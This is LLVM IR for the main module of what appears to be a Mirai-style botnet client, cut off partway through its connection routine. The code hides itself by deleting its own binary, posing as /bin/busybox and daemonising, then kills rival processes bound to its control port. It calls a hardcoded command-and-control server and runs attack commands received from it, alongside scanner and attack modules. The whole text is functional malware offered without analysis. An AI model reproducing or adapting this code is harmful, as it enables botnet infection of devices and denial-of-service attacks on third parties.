; ModuleID = 'main.c'
source_filename = "main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.__sigset_t = type { [16 x i64] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }

@fd_ctrl = dso_local global i32 -1, align 4
@fd_serv = dso_local global i32 -1, align 4
@pending_connection = dso_local global i8 0, align 1
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"/bin/busybox\00", align 1
@pid1 = dso_local global i32 0, align 4
@pid2 = dso_local global i32 0, align 4
@maintain_thread = dso_local global i32 0, align 4
@LOCAL_ADDR = dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@scanner_pid = dso_local global i32 0, align 4
@spid = dso_local global i32 0, align 4
@mainpid = dso_local global i32 0, align 4
@srv_addr = dso_local global %struct.sockaddr_in zeroinitializer, align 4
@ensure_single_instance.local_bind = internal global i8 1, align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.fd_set*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set*, align 8
  %19 = alloca i16, align 2
  %20 = alloca %struct.sockaddr_in, align 4
  %21 = alloca i32, align 4
  %22 = alloca %union.__SOCKADDR_ARG, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i16, align 2
  %28 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @unlink(i8* %31) #6
  %33 = call i32 @sigemptyset(%struct.__sigset_t* %9) #6
  %34 = call i32 @sigaddset(%struct.__sigset_t* %9, i32 2) #6
  %35 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %9, %struct.__sigset_t* null) #6
  %36 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  %37 = call void (i32)* @signal(i32 1, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  %38 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0)) #6
  call void @table_init()
  call void @ensure_single_instance()
  call void @rand_init()
  %39 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %39, i8 0, i64 32, i1 false)
  %40 = load i32, i32* %4, align 4
  %41 = icmp eq i32 %40, 2
  br i1 %41, label %42, label %62

42:                                               ; preds = %2
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @util_strlen(i8* %45)
  %47 = icmp slt i32 %46, 32
  br i1 %47, label %48, label %62

48:                                               ; preds = %42
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @util_strcpy(i8* %49, i8* %52)
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @util_strlen(i8* %59)
  %61 = sext i32 %60 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %56, i8 0, i64 %61, i1 false)
  br label %65

62:                                               ; preds = %42, %2
  %63 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0
  %64 = call i32 @util_strcpy(i8* %63, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  br label %65

65:                                               ; preds = %62, %48
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @util_strcpy(i8* %68, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  %70 = call i32 (i32, ...) @prctl(i32 15, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0)) #6
  %71 = call i32 @fork() #6
  store i32 %71, i32* @pid1, align 4
  %72 = load i32, i32* @pid1, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %75

74:                                               ; preds = %65
  call void @exit(i32 1) #7
  unreachable

75:                                               ; preds = %65
  %76 = call i32 @fork() #6
  store i32 %76, i32* @pid2, align 4
  %77 = load i32, i32* @pid2, align 4
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %79, label %80

79:                                               ; preds = %75
  call void @exit(i32 1) #7
  unreachable

80:                                               ; preds = %75
  %81 = call i32 @setsid() #6
  store i32 %81, i32* %7, align 4
  %82 = call i32 @close(i32 0)
  %83 = call i32 @close(i32 1)
  %84 = call i32 @close(i32 2)
  %85 = call signext i8 @attack_init()
  call void (...) @scanner_init()
  br label %86

86:                                               ; preds = %80, %180, %310, %316, %321, %356, %362, %383
  br label %87

87:                                               ; preds = %86
  store %struct.fd_set* %10, %struct.fd_set** %16, align 8
  store i32 0, i32* %15, align 4
  br label %88

88:                                               ; preds = %98, %87
  %89 = load i32, i32* %15, align 4
  %90 = zext i32 %89 to i64
  %91 = icmp ult i64 %90, 16
  br i1 %91, label %92, label %101

92:                                               ; preds = %88
  %93 = load %struct.fd_set*, %struct.fd_set** %16, align 8
  %94 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %93, i32 0, i32 0
  %95 = load i32, i32* %15, align 4
  %96 = zext i32 %95 to i64
  %97 = getelementptr inbounds [16 x i64], [16 x i64]* %94, i64 0, i64 %96
  store i64 0, i64* %97, align 8
  br label %98

98:                                               ; preds = %92
  %99 = load i32, i32* %15, align 4
  %100 = add i32 %99, 1
  store i32 %100, i32* %15, align 4
  br label %88, !llvm.loop !6

101:                                              ; preds = %88
  br label %102

102:                                              ; preds = %101
  br label %103

103:                                              ; preds = %102
  store %struct.fd_set* %11, %struct.fd_set** %18, align 8
  store i32 0, i32* %17, align 4
  br label %104

104:                                              ; preds = %114, %103
  %105 = load i32, i32* %17, align 4
  %106 = zext i32 %105 to i64
  %107 = icmp ult i64 %106, 16
  br i1 %107, label %108, label %117

108:                                              ; preds = %104
  %109 = load %struct.fd_set*, %struct.fd_set** %18, align 8
  %110 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %109, i32 0, i32 0
  %111 = load i32, i32* %17, align 4
  %112 = zext i32 %111 to i64
  %113 = getelementptr inbounds [16 x i64], [16 x i64]* %110, i64 0, i64 %112
  store i64 0, i64* %113, align 8
  br label %114

114:                                              ; preds = %108
  %115 = load i32, i32* %17, align 4
  %116 = add i32 %115, 1
  store i32 %116, i32* %17, align 4
  br label %104, !llvm.loop !8

117:                                              ; preds = %104
  br label %118

118:                                              ; preds = %117
  %119 = load i32, i32* @fd_ctrl, align 4
  %120 = icmp ne i32 %119, -1
  br i1 %120, label %121, label %133

121:                                              ; preds = %118
  %122 = load i32, i32* @fd_ctrl, align 4
  %123 = srem i32 %122, 64
  %124 = zext i32 %123 to i64
  %125 = shl i64 1, %124
  %126 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %127 = load i32, i32* @fd_ctrl, align 4
  %128 = sdiv i32 %127, 64
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [16 x i64], [16 x i64]* %126, i64 0, i64 %129
  %131 = load i64, i64* %130, align 8
  %132 = or i64 %131, %125
  store i64 %132, i64* %130, align 8
  br label %133

133:                                              ; preds = %121, %118
  %134 = load i32, i32* @fd_serv, align 4
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %136, label %137

136:                                              ; preds = %133
  call void @establish_connection()
  br label %137

137:                                              ; preds = %136, %133
  %138 = load i8, i8* @pending_connection, align 1
  %139 = icmp ne i8 %138, 0
  br i1 %139, label %140, label %152

140:                                              ; preds = %137
  %141 = load i32, i32* @fd_serv, align 4
  %142 = srem i32 %141, 64
  %143 = zext i32 %142 to i64
  %144 = shl i64 1, %143
  %145 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %146 = load i32, i32* @fd_serv, align 4
  %147 = sdiv i32 %146, 64
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [16 x i64], [16 x i64]* %145, i64 0, i64 %148
  %150 = load i64, i64* %149, align 8
  %151 = or i64 %150, %144
  store i64 %151, i64* %149, align 8
  br label %164

152:                                              ; preds = %137
  %153 = load i32, i32* @fd_serv, align 4
  %154 = srem i32 %153, 64
  %155 = zext i32 %154 to i64
  %156 = shl i64 1, %155
  %157 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %158 = load i32, i32* @fd_serv, align 4
  %159 = sdiv i32 %158, 64
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds [16 x i64], [16 x i64]* %157, i64 0, i64 %160
  %162 = load i64, i64* %161, align 8
  %163 = or i64 %162, %156
  store i64 %163, i64* %161, align 8
  br label %164

164:                                              ; preds = %152, %140
  %165 = load i32, i32* @fd_ctrl, align 4
  %166 = load i32, i32* @fd_serv, align 4
  %167 = icmp sgt i32 %165, %166
  br i1 %167, label %168, label %170

168:                                              ; preds = %164
  %169 = load i32, i32* @fd_ctrl, align 4
  store i32 %169, i32* %13, align 4
  br label %172

170:                                              ; preds = %164
  %171 = load i32, i32* @fd_serv, align 4
  store i32 %171, i32* %13, align 4
  br label %172

172:                                              ; preds = %170, %168
  %173 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %173, align 8
  %174 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 10, i64* %174, align 8
  %175 = load i32, i32* %13, align 4
  %176 = add nsw i32 %175, 1
  %177 = call i32 @select(i32 %176, %struct.fd_set* %10, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  store i32 %177, i32* %14, align 4
  %178 = load i32, i32* %14, align 4
  %179 = icmp eq i32 %178, -1
  br i1 %179, label %180, label %181

180:                                              ; preds = %172
  br label %86

181:                                              ; preds = %172
  %182 = load i32, i32* %14, align 4
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %194

184:                                              ; preds = %181
  store i16 0, i16* %19, align 2
  %185 = load i32, i32* %8, align 4
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %8, align 4
  %187 = srem i32 %185, 6
  %188 = icmp eq i32 %187, 0
  br i1 %188, label %189, label %193

189:                                              ; preds = %184
  %190 = load i32, i32* @fd_serv, align 4
  %191 = bitcast i16* %19 to i8*
  %192 = call i64 @send(i32 %190, i8* %191, i64 2, i32 16384)
  br label %193

193:                                              ; preds = %189, %184
  br label %194

194:                                              ; preds = %193, %181
  br label %195

195:                                              ; preds = %194
  %196 = load i32, i32* @fd_ctrl, align 4
  %197 = icmp ne i32 %196, -1
  br i1 %197, label %198, label %223

198:                                              ; preds = %195
  %199 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %200 = load i32, i32* @fd_ctrl, align 4
  %201 = sdiv i32 %200, 64
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [16 x i64], [16 x i64]* %199, i64 0, i64 %202
  %204 = load i64, i64* %203, align 8
  %205 = load i32, i32* @fd_ctrl, align 4
  %206 = srem i32 %205, 64
  %207 = zext i32 %206 to i64
  %208 = shl i64 1, %207
  %209 = and i64 %204, %208
  %210 = icmp ne i64 %209, 0
  br i1 %210, label %211, label %223

211:                                              ; preds = %198
  store i32 16, i32* %21, align 4
  %212 = load i32, i32* @fd_ctrl, align 4
  %213 = bitcast %union.__SOCKADDR_ARG* %22 to %struct.sockaddr**
  %214 = bitcast %struct.sockaddr_in* %20 to %struct.sockaddr*
  store %struct.sockaddr* %214, %struct.sockaddr** %213, align 8
  %215 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %22, i32 0, i32 0
  %216 = load %struct.sockaddr*, %struct.sockaddr** %215, align 8
  %217 = call i32 @accept(i32 %212, %struct.sockaddr* %216, i32* %21)
  call void @scanner_kill()
  %218 = load i32, i32* @maintain_thread, align 4
  %219 = call i32 @kill(i32 %218, i32 9) #6
  call void @attack_kill_all()
  %220 = load i32, i32* %7, align 4
  %221 = mul nsw i32 %220, -1
  %222 = call i32 @kill(i32 %221, i32 9) #6
  call void @exit(i32 0) #7
  unreachable

223:                                              ; preds = %198, %195
  %224 = load i8, i8* @pending_connection, align 1
  %225 = icmp ne i8 %224, 0
  br i1 %225, label %226, label %274

226:                                              ; preds = %223
  store i8 0, i8* @pending_connection, align 1
  %227 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %228 = load i32, i32* @fd_serv, align 4
  %229 = sdiv i32 %228, 64
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds [16 x i64], [16 x i64]* %227, i64 0, i64 %230
  %232 = load i64, i64* %231, align 8
  %233 = load i32, i32* @fd_serv, align 4
  %234 = srem i32 %233, 64
  %235 = zext i32 %234 to i64
  %236 = shl i64 1, %235
  %237 = and i64 %232, %236
  %238 = icmp ne i64 %237, 0
  br i1 %238, label %240, label %239

239:                                              ; preds = %226
  call void @teardown_connection()
  br label %273

240:                                              ; preds = %226
  store i32 0, i32* %23, align 4
  store i32 4, i32* %24, align 4
  %241 = load i32, i32* @fd_serv, align 4
  %242 = bitcast i32* %23 to i8*
  %243 = call i32 @getsockopt(i32 %241, i32 1, i32 4, i8* %242, i32* %24) #6
  %244 = load i32, i32* %23, align 4
  %245 = icmp ne i32 %244, 0
  br i1 %245, label %246, label %253

246:                                              ; preds = %240
  %247 = load i32, i32* @fd_serv, align 4
  %248 = call i32 @close(i32 %247)
  store i32 -1, i32* @fd_serv, align 4
  %249 = call i32 @rand_next()
  %250 = urem i32 %249, 10
  %251 = add i32 %250, 1
  %252 = call i32 @sleep(i32 %251)
  br label %272

253:                                              ; preds = %240
  %254 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0
  %255 = call i32 @util_strlen(i8* %254)
  %256 = trunc i32 %255 to i8
  store i8 %256, i8* %25, align 1
  %257 = call i32 @util_local_addr()
  store i32 %257, i32* @LOCAL_ADDR, align 4
  %258 = load i32, i32* @fd_serv, align 4
  %259 = call i64 @send(i32 %258, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i64 4, i32 16384)
  %260 = load i32, i32* @fd_serv, align 4
  %261 = call i64 @send(i32 %260, i8* %25, i64 1, i32 16384)
  %262 = load i8, i8* %25, align 1
  %263 = zext i8 %262 to i32
  %264 = icmp sgt i32 %263, 0
  br i1 %264, label %265, label %271

265:                                              ; preds = %253
  %266 = load i32, i32* @fd_serv, align 4
  %267 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0
  %268 = load i8, i8* %25, align 1
  %269 = zext i8 %268 to i64
  %270 = call i64 @send(i32 %266, i8* %267, i64 %269, i32 16384)
  br label %271

271:                                              ; preds = %265, %253
  br label %272

272:                                              ; preds = %271, %246
  br label %273

273:                                              ; preds = %272, %239
  br label %383

274:                                              ; preds = %223
  %275 = load i32, i32* @fd_serv, align 4
  %276 = icmp ne i32 %275, -1
  br i1 %276, label %277, label %382

277:                                              ; preds = %274
  %278 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %279 = load i32, i32* @fd_serv, align 4
  %280 = sdiv i32 %279, 64
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds [16 x i64], [16 x i64]* %278, i64 0, i64 %281
  %283 = load i64, i64* %282, align 8
  %284 = load i32, i32* @fd_serv, align 4
  %285 = srem i32 %284, 64
  %286 = zext i32 %285 to i64
  %287 = shl i64 1, %286
  %288 = and i64 %283, %287
  %289 = icmp ne i64 %288, 0
  br i1 %289, label %290, label %382

290:                                              ; preds = %277
  %291 = call i32* @__errno_location() #8
  store i32 0, i32* %291, align 4
  %292 = load i32, i32* @fd_serv, align 4
  %293 = bitcast i16* %27 to i8*
  %294 = call i64 @recv(i32 %292, i8* %293, i64 2, i32 16386)
  %295 = trunc i64 %294 to i32
  store i32 %295, i32* %26, align 4
  %296 = load i32, i32* %26, align 4
  %297 = icmp eq i32 %296, -1
  br i1 %297, label %298, label %313

298:                                              ; preds = %290
  %299 = call i32* @__errno_location() #8
  %300 = load i32, i32* %299, align 4
  %301 = icmp eq i32 %300, 11
  br i1 %301, label %310, label %302

302:                                              ; preds = %298
  %303 = call i32* @__errno_location() #8
  %304 = load i32, i32* %303, align 4
  %305 = icmp eq i32 %304, 11
  br i1 %305, label %310, label %306

306:                                              ; preds = %302
  %307 = call i32* @__errno_location() #8
  %308 = load i32, i32* %307, align 4
  %309 = icmp eq i32 %308, 4
  br i1 %309, label %310, label %311

310:                                              ; preds = %306, %302, %298
  br label %86

311:                                              ; preds = %306
  store i32 0, i32* %26, align 4
  br label %312

312:                                              ; preds = %311
  br label %313

313:                                              ; preds = %312, %290
  %314 = load i32, i32* %26, align 4
  %315 = icmp eq i32 %314, 0
  br i1 %315, label %316, label %317

316:                                              ; preds = %313
  call void @teardown_connection()
  br label %86

317:                                              ; preds = %313
  %318 = load i16, i16* %27, align 2
  %319 = zext i16 %318 to i32
  %320 = icmp eq i32 %319, 0
  br i1 %320, label %321, label %325

321:                                              ; preds = %317
  %322 = load i32, i32* @fd_serv, align 4
  %323 = bitcast i16* %27 to i8*
  %324 = call i64 @recv(i32 %322, i8* %323, i64 2, i32 16384)
  br label %86

325:                                              ; preds = %317
  %326 = load i16, i16* %27, align 2
  %327 = call zeroext i16 @ntohs(i16 zeroext %326) #8
  store i16 %327, i16* %27, align 2
  %328 = load i16, i16* %27, align 2
  %329 = zext i16 %328 to i64
  %330 = icmp ugt i64 %329, 1024
  br i1 %330, label %331, label %334

331:                                              ; preds = %325
  %332 = load i32, i32* @fd_serv, align 4
  %333 = call i32 @close(i32 %332)
  store i32 -1, i32* @fd_serv, align 4
  br label %334

334:                                              ; preds = %331, %325
  %335 = call i32* @__errno_location() #8
  store i32 0, i32* %335, align 4
  %336 = load i32, i32* @fd_serv, align 4
  %337 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %338 = load i16, i16* %27, align 2
  %339 = zext i16 %338 to i64
  %340 = call i64 @recv(i32 %336, i8* %337, i64 %339, i32 16386)
  %341 = trunc i64 %340 to i32
  store i32 %341, i32* %26, align 4
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  br i1 %343, label %344, label %359

344:                                              ; preds = %334
  %345 = call i32* @__errno_location() #8
  %346 = load i32, i32* %345, align 4
  %347 = icmp eq i32 %346, 11
  br i1 %347, label %356, label %348

348:                                              ; preds = %344
  %349 = call i32* @__errno_location() #8
  %350 = load i32, i32* %349, align 4
  %351 = icmp eq i32 %350, 11
  br i1 %351, label %356, label %352

352:                                              ; preds = %348
  %353 = call i32* @__errno_location() #8
  %354 = load i32, i32* %353, align 4
  %355 = icmp eq i32 %354, 4
  br i1 %355, label %356, label %357

356:                                              ; preds = %352, %348, %344
  br label %86

357:                                              ; preds = %352
  store i32 0, i32* %26, align 4
  br label %358

358:                                              ; preds = %357
  br label %359

359:                                              ; preds = %358, %334
  %360 = load i32, i32* %26, align 4
  %361 = icmp eq i32 %360, 0
  br i1 %361, label %362, label %363

362:                                              ; preds = %359
  call void @teardown_connection()
  br label %86

363:                                              ; preds = %359
  %364 = load i32, i32* @fd_serv, align 4
  %365 = bitcast i16* %27 to i8*
  %366 = call i64 @recv(i32 %364, i8* %365, i64 2, i32 16384)
  %367 = load i16, i16* %27, align 2
  %368 = call zeroext i16 @ntohs(i16 zeroext %367) #8
  store i16 %368, i16* %27, align 2
  %369 = load i32, i32* @fd_serv, align 4
  %370 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %371 = load i16, i16* %27, align 2
  %372 = zext i16 %371 to i64
  %373 = call i64 @recv(i32 %369, i8* %370, i64 %372, i32 16384)
  %374 = load i16, i16* %27, align 2
  %375 = zext i16 %374 to i32
  %376 = icmp sgt i32 %375, 0
  br i1 %376, label %377, label %381

377:                                              ; preds = %363
  %378 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %379 = load i16, i16* %27, align 2
  %380 = zext i16 %379 to i32
  call void @attack_parse(i8* %378, i32 %380)
  br label %381

381:                                              ; preds = %377, %363
  br label %382

382:                                              ; preds = %381, %277, %274
  br label %383

383:                                              ; preds = %382, %273
  br label %86
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #1

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #1

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

declare void @table_init() #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @ensure_single_instance() #0 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  %3 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 1, i32* %2, align 4
  %5 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %5, i32* @fd_ctrl, align 4
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %8

7:                                                ; preds = %0
  br label %74

8:                                                ; preds = %0
  %9 = load i32, i32* @fd_ctrl, align 4
  %10 = bitcast i32* %2 to i8*
  %11 = call i32 @setsockopt(i32 %9, i32 1, i32 2, i8* %10, i32 4) #6
  %12 = load i32, i32* @fd_ctrl, align 4
  %13 = load i32, i32* @fd_ctrl, align 4
  %14 = call i32 (i32, i32, ...) @fcntl(i32 %13, i32 3, i32 0)
  %15 = or i32 2048, %14
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 4, i32 %15)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %8
  %22 = call i32 @htonl(i32 2130706433) #8
  br label %25

23:                                               ; preds = %8
  %24 = load i32, i32* @LOCAL_ADDR, align 4
  br label %25

25:                                               ; preds = %23, %21
  %26 = phi i32 [ %22, %21 ], [ %24, %23 ]
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %28 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %27, i32 0, i32 0
  store i32 %26, i32* %28, align 4
  %29 = call zeroext i16 @htons(i16 zeroext -14435) #8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  %31 = call i32* @__errno_location() #8
  store i32 0, i32* %31, align 4
  %32 = load i32, i32* @fd_ctrl, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %3 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %3, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @bind(i32 %32, %struct.sockaddr* %36, i32 16) #6
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %68

39:                                               ; preds = %25
  %40 = call i32* @__errno_location() #8
  %41 = load i32, i32* %40, align 4
  %42 = icmp eq i32 %41, 99
  br i1 %42, label %43, label %48

43:                                               ; preds = %39
  %44 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %48

47:                                               ; preds = %43
  store i8 0, i8* @ensure_single_instance.local_bind, align 1
  br label %48

48:                                               ; preds = %47, %43, %39
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %49, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  store i32 0, i32* %51, align 4
  %52 = call zeroext i16 @htons(i16 zeroext -14435) #8
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  %54 = load i32, i32* @fd_ctrl, align 4
  %55 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %56 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %56, %struct.sockaddr** %55, align 8
  %57 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %58 = load %struct.sockaddr*, %struct.sockaddr** %57, align 8
  %59 = call i32 @connect(i32 %54, %struct.sockaddr* %58, i32 16)
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

61:                                               ; preds = %48
  br label %62

62:                                               ; preds = %61, %48
  %63 = call i32 @sleep(i32 5)
  %64 = load i32, i32* @fd_ctrl, align 4
  %65 = call i32 @close(i32 %64)
  %66 = call zeroext i16 @htons(i16 zeroext -14435) #8
  %67 = call signext i8 @killer_kill_by_port(i16 zeroext %66)
  call void @ensure_single_instance()
  br label %74

68:                                               ; preds = %25
  %69 = load i32, i32* @fd_ctrl, align 4
  %70 = call i32 @listen(i32 %69, i32 1) #6
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %73

72:                                               ; preds = %68
  br label %73

73:                                               ; preds = %72, %68
  br label %74

74:                                               ; preds = %7, %73, %62
  ret void
}

declare void @rand_init() #2

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

declare i32 @util_strlen(i8*) #2

declare i32 @util_strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: nounwind
declare i32 @setsid() #1

declare i32 @close(i32) #2

declare signext i8 @attack_init() #2

declare void @scanner_init(...) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @establish_connection() #0 {
  %1 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %2 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %2, i32* @fd_serv, align 4
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

4:                                                ; preds = %0
  br label %18

5:                                                ; preds = %0
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 0), align 4
  %6 = call i32 @htonl(i32 -1335130672) #8
  store i32 %6, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %7 = call zeroext i16 @htons(i16 zeroext 1024) #8
  store i16 %7, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  %8 = load i32, i32* @fd_serv, align 4
  %9 = load i32, i32* @fd_serv, align 4
  %10 = call i32 (i32, i32, ...) @fcntl(i32 %9, i32 3, i32 0)
  %11 = or i32 2048, %10
  %12 = call i32 (i32, i32, ...) @fcntl(i32 %8, i32 4, i32 %11)
  store i8 1, i8* @pending_connection, align 1
  %13 = load i32, i32* @fd_serv, align 4
  %14 = bitcast %union.__CONST_SOCKADDR_ARG* %1 to %struct.sockaddr**
  store %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), %struct.sockaddr** %14, align 8
